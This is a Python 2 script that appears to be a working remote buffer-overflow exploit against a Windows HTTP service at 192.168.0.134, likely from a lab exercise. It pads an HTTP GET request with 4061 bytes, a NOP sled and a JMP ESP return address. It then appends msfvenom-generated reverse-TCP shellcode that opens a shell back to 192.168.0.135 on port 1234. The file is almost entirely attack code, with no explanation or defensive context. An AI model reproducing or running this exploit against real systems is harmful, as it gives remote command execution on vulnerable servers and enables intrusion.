#!/usr/bin/python
import socket
import os
import sys, struct

#msfvenom -p windows/shell_reverse_tcp LHOS=192.168.0.135 LPORT=1234 EXITFUNC=thread -f c  -b "\x00\x20"

Shellcode= ("\xbb\xa9\xf6\x1c\x9a\xdb\xd6\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x83\xc2\x04\x31\x5a\x0e\x03\xf3\xf8\xfe\x6f\xff\xed\x7d"
"\x8f\xff\xed\xe1\x19\x1a\xdc\x21\x7d\x6f\x4f\x92\xf5\x3d\x7c"
"\x59\x5b\xd5\xf7\x2f\x74\xda\xb0\x9a\xa2\xd5\x41\xb6\x97\x74"
"\xc2\xc5\xcb\x56\xfb\x05\x1e\x97\x3c\x7b\xd3\xc5\x95\xf7\x46"
"\xf9\x92\x42\x5b\x72\xe8\x43\xdb\x67\xb9\x62\xca\x36\xb1\x3c"
"\xcc\xb9\x16\x35\x45\xa1\x7b\x70\x1f\x5a\x4f\x0e\x9e\x8a\x81"
"\xef\x0d\xf3\x2d\x02\x4f\x34\x89\xfd\x3a\x4c\xe9\x80\x3c\x8b"
"\x93\x5e\xc8\x0f\x33\x14\x6a\xeb\xc5\xf9\xed\x78\xc9\xb6\x7a"
"\x26\xce\x49\xae\x5d\xea\xc2\x51\xb1\x7a\x90\x75\x15\x26\x42"
"\x17\x0c\x82\x25\x28\x4e\x6d\x99\x8c\x05\x80\xce\xbc\x44\xcd"
"\x23\x8d\x76\x0d\x2c\x86\x05\x3f\xf3\x3c\x81\x73\x7c\x9b\x56"
"\x73\x57\x5b\xc8\x8a\x58\x9c\xc1\x48\x0c\xcc\x79\x78\x2d\x87"
"\x79\x85\xf8\x08\x29\x29\x53\xe9\x99\x89\x03\x81\xf3\x05\x7b"
"\xb1\xfc\xcf\x14\x58\x07\x98\xda\x35\x07\xdf\xb3\x47\x07\xdb"
"\x91\xc1\xe1\x89\x05\x84\xba\x25\xbf\x8d\x30\xd7\x40\x18\x3d"
"\xd7\xcb\xaf\xc2\x96\x3b\xc5\xd0\x4f\xcc\x90\x8a\xc6\xd3\x0e"
"\xa2\x85\x46\xd5\x32\xc3\x7a\x42\x65\x84\x4d\x9b\xe3\x38\xf7"
"\x35\x11\xc1\x61\x7d\x91\x1e\x52\x80\x18\xd2\xee\xa6\x0a\x2a"
"\xee\xe2\x7e\xe2\xb9\xbc\x28\x44\x10\x0f\x82\x1e\xcf\xd9\x42"
"\xe6\x23\xda\x14\xe7\x69\xac\xf8\x56\xc4\xe9\x07\x56\x80\xfd"
"\x70\x8a\x30\x01\xab\x0e\x50\xe0\x79\x7b\xf9\xbd\xe8\xc6\x64"
"\x3e\xc7\x05\x91\xbd\xed\xf5\x66\xdd\x84\xf0\x23\x59\x75\x89"
"\x3c\x0c\x79\x3e\x3c\x05")

jmp_esp= struct.pack("<I", 0x1000108B)

buff = "A" * 4061 
buff+= "\x90" *20
buff+= jmp_esp
buff+= Shellcode
buff+= "D" * (5000-len(buff))


try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.134',80))
    print "Sending paylaod..........."
    s.send(("GET " + buff + " HTTP/1.0\r\n\r\n"))
    s.recv(1024)
    s.close()

except: 
     print("Unable to connect.......")
     sys.exit()     